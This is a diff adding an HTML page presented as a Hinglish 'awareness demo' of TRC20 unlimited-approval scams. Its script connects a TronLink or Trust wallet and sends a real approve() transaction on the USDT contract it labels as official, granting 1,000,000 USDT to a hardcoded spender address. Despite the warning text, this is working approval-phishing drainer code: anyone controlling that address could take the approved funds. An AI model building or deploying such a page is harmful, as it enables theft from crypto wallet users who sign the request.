@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>TRC20 Unlimited Approve – Awareness Demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <style>
+    body { font-family: system-ui, Arial, sans-serif; margin:0; background:#0b1020; color:#eef2ff; }
+    .wrap { max-width:680px; margin:0 auto; padding:32px; }
+    .card { background:#111834; border:1px solid #1c2450; border-radius:16px; padding:24px; box-shadow:0 8px 24px rgba(0,0,0,.25); }
+    h1 { margin:0 0 8px; font-size:1.4rem; }
+    p  { margin:6px 0 14px; opacity:.9; }
+    button { width:100%; padding:12px 14px; border:0; border-radius:12px; font-weight:600; cursor:pointer; }
+    .btn { background:#3b82f6; color:white; margin-top:10px; }
+    .btn:disabled { opacity:.6; cursor:not-allowed; }
+    .muted { font-size:.9rem; opacity:.8; }
+    .ok { color:#34d399; } 
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; word-break:break-all; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>TRC20 Unlimited Approve – <span class="muted">Awareness Demo</span></h1>
+      <p><b>Warning:</b> Ye sirf demo hai. Yahan jo approve request dikh rahi hai wo
+        <b>1,000,000 USDT</b> ke liye hai. Scam websites isi trick ka misuse karti hain.
+        Agar aapko kabhi aisi request aaye to turant <b>Cancel</b> karein.</p>
+
+      <div id="status" class="muted">Wallet not connected.</div>
+
+      <button id="connect" class="btn">🔗 Connect Wallet</button>
+      <button id="approve" class="btn" disabled>⚠️ Approve 1,000,000 USDT</button>
+
+      <div style="margin-top:16px;">
+        <div>Connected: <span id="addr" class="mono">—</span></div>
+        <div>Last Tx: <span id="tx" class="mono">—</span></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Official TRON USDT
+    const DECIMALS = 6;  // USDT decimals
+    const $ = id => document.getElementById(id);
+
+    let ready = false;
+
+    function setStatus(msg, ok=false) {
+      const el = $("status");
+      el.innerText = msg;
+      el.className = ok ? "ok" : "muted";
+    }
+
+    async function waitForTronWeb(timeoutMs = 8000) {
+      const start = Date.now();
+      return new Promise(resolve => {
+        const iv = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.ready) {
+            clearInterval(iv);
+            resolve(true);
+          }
+          if (Date.now() - start > timeoutMs) {
+            clearInterval(iv);
+            resolve(false);
+          }
+        }, 200);
+      });
+    }
+
+    $("connect").onclick = async () => {
+      setStatus("Looking for wallet…");
+      const ok = await waitForTronWeb();
+      if (!ok) { setStatus("Wallet not found. Open in TronLink/Trust dApp browser."); return; }
+      ready = true;
+      $("approve").disabled = false;
+      $("addr").innerText = tronWeb.defaultAddress.base58;
+      setStatus("Wallet connected.", true);
+    };
+
+    $("approve").onclick = async () => {
+      if (!ready) return;
+      try {
+        // Awareness demo: very large approval (1,000,000 USDT)
+        const spender = "TJr9bYwYvApZ1aW8eW2Wkmk1u1sGkVQ3pZ"; // dummy spender
+        const human = 1_000_000;
+        const amount = BigInt(human * Math.pow(10, DECIMALS)).toString();
+
+        const contract = await tronWeb.contract().at(USDT_CONTRACT);
+        setStatus("Sending approve transaction…");
+        const txid = await contract.approve(spender, amount).send();
+        $("tx").innerText = txid;
+        setStatus("Approve request sent. Check wallet popup.", true);
+
+        console.log("Tx on tronscan:", `https://tronscan.org/#/transaction/${txid}`);
+      } catch (e) {
+        console.error(e);
+        setStatus("User cancelled or error.", false);
+      }
+    };
+  </script>
+</body>
+</html>
